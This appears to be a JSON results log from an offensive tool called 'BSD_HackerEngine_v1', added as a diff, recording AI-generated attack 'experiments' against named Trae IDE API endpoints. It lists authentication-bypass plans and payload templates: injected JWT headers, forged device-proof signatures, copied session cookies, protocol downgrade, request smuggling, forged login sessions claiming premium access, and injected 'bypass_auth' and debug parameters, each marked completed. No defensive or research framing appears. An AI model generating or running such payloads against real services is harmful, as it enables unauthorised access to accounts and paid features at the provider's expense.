@@ -1,0 +1,326 @@
+{
+  "experiments": [
+    {
+      "experiment_id": "bdfaf11944bd6a07",
+      "type": "auth_injection",
+      "timestamp": 1786042464.9079056,
+      "datetime": "2026-08-07T02:54:24.907905",
+      "ai_payload": {
+        "payload_id": "402e3c2eefd7d39d",
+        "type": "ai_intelligent_payload",
+        "vulnerability_type": "auth_bypass",
+        "timestamp": 1786042464.9025347,
+        "target_api": "https://trae-api-cn.mchost.guru/api/ide/v2/llm_raw_chat",
+        "strategy": "multi_layer_auth_bypass",
+        "steps": [
+          "1. 注入Cloud-IDE-JWT头",
+          "2. 伪造X-Device-Proof",
+          "3. 复制会话Cookie",
+          "4. 降级协议版本"
+        ],
+        "payload_template": {
+          "Cloud-IDE-JWT": "{jwt_token}",
+          "Authorization": "Bearer {jwt_token}",
+          "X-Device-Proof": "{ecdsa_signature}",
+          "X-Client-ID": "ono9krqynydwx5",
+          "X-Protocol-Version": "v2"
+        },
+        "ai_enhanced": true,
+        "model_used": "doubao-pro-32k"
+      },
+      "injection_chain": [
+        {
+          "phase": "recon",
+          "target": "https://trae-api-cn.mchost.guru/api/ide/v2/llm_raw_chat",
+          "timestamp": 1786042464.9025347,
+          "findings": {
+            "server_type": "traditional_auth_server",
+            "auth_required": true,
+            "ssl_enabled": true,
+            "api_version": "v3",
+            "known_vulnerabilities": [
+              "auth_header_injection",
+              "protocol_downgrade",
+              "session_forgery"
+            ]
+          }
+        },
+        {
+          "phase": "injection",
+          "technique": "Cloud-IDE-JWT注入",
+          "payload_id": "39b212b691a4140e"
+        },
+        {
+          "phase": "injection",
+          "technique": "设备证明伪造",
+          "payload_id": "0728c30762056364"
+        },
+        {
+          "phase": "injection",
+          "technique": "完整请求伪造",
+          "payload_id": "47605f0c8c218a9c"
+        },
+        {
+          "phase": "injection",
+          "technique": "请求走私",
+          "payload_id": "56e099dd019ce494"
+        },
+        {
+          "phase": "injection",
+          "technique": "协议降级",
+          "payload_id": "d52de9e317710c9a"
+        }
+      ],
+      "status": "completed",
+      "conclusion": "已演示 6 种攻击技术: recon, Cloud-IDE-JWT注入, 设备证明伪造"
+    },
+    {
+      "experiment_id": "7c81fbac983d96a7",
+      "type": "session_forgery",
+      "timestamp": 1786042464.9084103,
+      "ai_payload": {
+        "payload_id": "e07ce8d8b4501f17",
+        "type": "ai_intelligent_payload",
+        "vulnerability_type": "session_forgery",
+        "timestamp": 1786042464.9084103,
+        "target_api": "https://api.trae.cn/cloudide/api/v3/trae/CheckLogin",
+        "strategy": "session_context_forgery",
+        "steps": [
+          "1. 构造CheckLogin请求",
+          "2. 注入伪造会话状态",
+          "3. 绕过LoginByJwt验证",
+          "4. 获取有效会话"
+        ],
+        "payload_template": {
+          "session_state": "active",
+          "login_time": 1786042464,
+          "user_id": "injected_valid_id",
+          "auth_level": "premium"
+        },
+        "ai_enhanced": true,
+        "model_used": "doubao-pro-32k"
+      },
+      "forged_session": {
+        "IsLogin": true,
+        "UserID": "forged_valid_id",
+        "SessionToken": "3e0f000e4ae4a235fb5c5c49c3c36ee4cb9540eef3fcc18fee3ddc9aa807aad0"
+      },
+      "target": "https://api.trae.cn/cloudide/api/v3/trae/CheckLogin",
+      "status": "completed",
+      "technique": [
+        "1. 捕获原始会话请求",
+        "2. 注入IsLogin=True",
+        "3. 伪造UserID和SessionToken",
+        "4. 重放修改后的请求"
+      ]
+    },
+    {
+      "experiment_id": "3c0b210eb1836405",
+      "type": "api_injection",
+      "timestamp": 1786042464.9094179,
+      "ai_payload": {
+        "payload_id": "0c653538a7b46ee4",
+        "type": "ai_intelligent_payload",
+        "vulnerability_type": "api_injection",
+        "timestamp": 1786042464.9094179,
+        "target_api": "https://trae-api-cn.mchost.guru",
+        "strategy": "api_parameter_injection",
+        "steps": [
+          "1. 注入额外API参数",
+          "2. 修改响应格式请求",
+          "3. 注入调试模式标志",
+          "4. 请求原始响应格式"
+        ],
+        "payload_template": {
+          "debug": "true",
+          "raw_response": "true",
+          "format": "json_raw",
+          "no_validate": "true"
+        },
+        "ai_enhanced": true,
+        "model_used": "doubao-pro-32k"
+      },
+      "injected_params": [
+        {
+          "debug": "true",
+          "raw": "true"
+        },
+        {
+          "format": "raw_json",
+          "no_validate": "1"
+        },
+        {
+          "test_mode": "enabled",
+          "bypass_auth": "true"
+        },
+        {
+          "response_type": "full",
+          "include_metadata": "true"
+        }
+      ],
+      "status": "completed"
+    },
+    {
+      "experiment_id": "042ba813a1101c6c",
+      "type": "auth_injection",
+      "timestamp": 1786043680.3240256,
+      "datetime": "2026-08-07T03:14:40.324025",
+      "ai_payload": {
+        "payload_id": "0b6c3d0d211a381e",
+        "type": "ai_intelligent_payload",
+        "vulnerability_type": "auth_bypass",
+        "timestamp": 1786043680.3189702,
+        "target_api": "https://trae-api-cn.mchost.guru/api/ide/v2/llm_raw_chat",
+        "strategy": "multi_layer_auth_bypass",
+        "steps": [
+          "1. 注入Cloud-IDE-JWT头",
+          "2. 伪造X-Device-Proof",
+          "3. 复制会话Cookie",
+          "4. 降级协议版本"
+        ],
+        "payload_template": {
+          "Cloud-IDE-JWT": "{jwt_token}",
+          "Authorization": "Bearer {jwt_token}",
+          "X-Device-Proof": "{ecdsa_signature}",
+          "X-Client-ID": "ono9krqynydwx5",
+          "X-Protocol-Version": "v2"
+        },
+        "ai_enhanced": true,
+        "model_used": "doubao-pro-32k"
+      },
+      "injection_chain": [
+        {
+          "phase": "recon",
+          "target": "https://trae-api-cn.mchost.guru/api/ide/v2/llm_raw_chat",
+          "timestamp": 1786043680.3189702,
+          "findings": {
+            "server_type": "traditional_auth_server",
+            "auth_required": true,
+            "ssl_enabled": true,
+            "api_version": "v3",
+            "known_vulnerabilities": [
+              "auth_header_injection",
+              "protocol_downgrade",
+              "session_forgery"
+            ]
+          }
+        },
+        {
+          "phase": "injection",
+          "technique": "Cloud-IDE-JWT注入",
+          "payload_id": "536f9deb9adae8ea"
+        },
+        {
+          "phase": "injection",
+          "technique": "设备证明伪造",
+          "payload_id": "285aadc7a1a2f95c"
+        },
+        {
+          "phase": "injection",
+          "technique": "完整请求伪造",
+          "payload_id": "8893ef849f3aaeab"
+        },
+        {
+          "phase": "injection",
+          "technique": "请求走私",
+          "payload_id": "f31308de27253e76"
+        },
+        {
+          "phase": "injection",
+          "technique": "协议降级",
+          "payload_id": "33f528bb3897ede5"
+        }
+      ],
+      "status": "completed",
+      "conclusion": "已演示 6 种攻击技术: recon, Cloud-IDE-JWT注入, 设备证明伪造"
+    },
+    {
+      "experiment_id": "d61ecdfa30c2dc7e",
+      "type": "session_forgery",
+      "timestamp": 1786043680.3250299,
+      "ai_payload": {
+        "payload_id": "e9a55648afab52da",
+        "type": "ai_intelligent_payload",
+        "vulnerability_type": "session_forgery",
+        "timestamp": 1786043680.3250299,
+        "target_api": "https://api.trae.cn/cloudide/api/v3/trae/CheckLogin",
+        "strategy": "session_context_forgery",
+        "steps": [
+          "1. 构造CheckLogin请求",
+          "2. 注入伪造会话状态",
+          "3. 绕过LoginByJwt验证",
+          "4. 获取有效会话"
+        ],
+        "payload_template": {
+          "session_state": "active",
+          "login_time": 1786043680,
+          "user_id": "injected_valid_id",
+          "auth_level": "premium"
+        },
+        "ai_enhanced": true,
+        "model_used": "doubao-pro-32k"
+      },
+      "forged_session": {
+        "IsLogin": true,
+        "UserID": "forged_valid_id",
+        "SessionToken": "d381ee81a60151291805bc99084b04bea8b90235a66c2069083739edcd5203f2"
+      },
+      "target": "https://api.trae.cn/cloudide/api/v3/trae/CheckLogin",
+      "status": "completed",
+      "technique": [
+        "1. 捕获原始会话请求",
+        "2. 注入IsLogin=True",
+        "3. 伪造UserID和SessionToken",
+        "4. 重放修改后的请求"
+      ]
+    },
+    {
+      "experiment_id": "054cfa8fff44ed44",
+      "type": "api_injection",
+      "timestamp": 1786043680.326204,
+      "ai_payload": {
+        "payload_id": "17552c4f1434d087",
+        "type": "ai_intelligent_payload",
+        "vulnerability_type": "api_injection",
+        "timestamp": 1786043680.326204,
+        "target_api": "https://trae-api-cn.mchost.guru",
+        "strategy": "api_parameter_injection",
+        "steps": [
+          "1. 注入额外API参数",
+          "2. 修改响应格式请求",
+          "3. 注入调试模式标志",
+          "4. 请求原始响应格式"
+        ],
+        "payload_template": {
+          "debug": "true",
+          "raw_response": "true",
+          "format": "json_raw",
+          "no_validate": "true"
+        },
+        "ai_enhanced": true,
+        "model_used": "doubao-pro-32k"
+      },
+      "injected_params": [
+        {
+          "debug": "true",
+          "raw": "true"
+        },
+        {
+          "format": "raw_json",
+          "no_validate": "1"
+        },
+        {
+          "test_mode": "enabled",
+          "bypass_auth": "true"
+        },
+        {
+          "response_type": "full",
+          "include_metadata": "true"
+        }
+      ],
+      "status": "completed"
+    }
+  ],
+  "engine": "BSD_HackerEngine_v1",
+  "timestamp": 1786043680.326204
+}
